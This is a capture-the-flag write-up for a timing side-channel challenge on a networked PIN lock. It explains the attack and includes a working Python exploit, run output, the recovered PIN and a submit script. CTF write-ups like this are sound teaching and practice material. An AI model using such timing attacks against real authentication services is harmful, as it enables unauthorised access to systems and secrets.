# Sidan Av Kanalen — English

**Category:** Misc (timing side channel) · **Service:** `nc challs.crate.nu 31598`

The service prints `Enter the combination for the lock` and reads one line. It compares the
submitted PIN to the secret **character by character from the front** and sleeps a fixed
amount per already-correct prefix character before failing. Each additional correct leading
character therefore adds a consistent, measurable delay to the response — a classic timing
side channel that leaks the PIN one digit at a time.

## Attack parameters

- **Alphabet:** decimal digits `0`–`9` (the PIN is numeric).
- **PIN length:** unknown in advance; recovered to be **16 digits**. The attack stops
  automatically when no candidate digit stands out (see the stop condition).
- **Samples per candidate:** 2–3 probes per digit; take the **minimum** (or median) time to
  suppress positive network jitter.
- **Per-correct-character delay:** ≈ **0.40 s** added per correct prefix character. Baseline
  latency grows as the prefix gets longer (several seconds near the end).
- **Stop/decision threshold:** keep the digit whose time is highest; if the gap between the
  best and second-best candidate is **< 0.15 s**, there is no clear winner → the PIN is
  complete.

## Algorithm

1. Start with an empty prefix.
2. For the next position, for each digit `0`–`9`, connect, read the banner, send
   `prefix + digit + "\n"`, and measure the round-trip time until the response. Repeat for
   the configured number of samples and reduce to one statistic (min/median).
3. Rank the 10 digits by time, descending. The correct digit is the one with the extra
   ~0.4 s delay.
4. If `best_time − second_best_time ≥ 0.15 s`, append the best digit to the prefix and go to
   step 2. Otherwise stop: the prefix is the full PIN.

## Exploit

```python
import socket, time

HOST, PORT = "challs.crate.nu", 31598

def try_prefix(guess, samples=3):
    times = []
    for _ in range(samples):
        s = socket.socket()
        s.settimeout(8)
        s.connect((HOST, PORT))
        s.recv(4096)                      # banner
        t0 = time.time()
        s.sendall((guess + "\n").encode())
        try:
            s.recv(4096)
        except socket.timeout:
            pass
        times.append(time.time() - t0)
        s.close()
    return min(times)                     # min suppresses positive jitter

prefix = ""
for pos in range(40):                     # PAD/upper bound; real PIN is 16
    scores = {d: try_prefix(prefix + d) for d in "0123456789"}
    ranked = sorted(scores.items(), key=lambda kv: -kv[1])
    best_d, best_t = ranked[0]
    gap = best_t - ranked[1][1]
    if gap < 0.15:                        # no clear winner -> PIN complete
        print("PIN complete:", prefix)
        break
    prefix += best_d
    print(f"pos {pos}: best={best_d} gap={gap:.3f} prefix={prefix}")

print("FINAL PIN:", prefix)
```

Running to completion recovers the PIN **`1936480632978469`** (16 digits). The stop
condition triggers cleanly at position 16 (gap ≈ 0.0008 s), confirming the length. Example
tail of a run:

```text
pos 15 best=9 gap=0.400
=== position 16 prefix so far: 1936480632978469
pos 16 best=8 gap=0.00084 -> No clear separation, stopping
FINAL PIN: 1936480632978469
```

## Submit the PIN and read the flag

```python
import socket
s = socket.create_connection(("challs.crate.nu", 31598), timeout=10)
s.recv(4096)                             # banner
s.sendall(b"1936480632978469\n")
print(s.recv(4096).decode())             # -> cratectf{...}
```

The service responds directly with `cratectf{...}` (redacted here).

## Verification

Platform-confirmed solved. Submitting PIN `1936480632978469` returns the flag; the literal
flag value is redacted for publication.
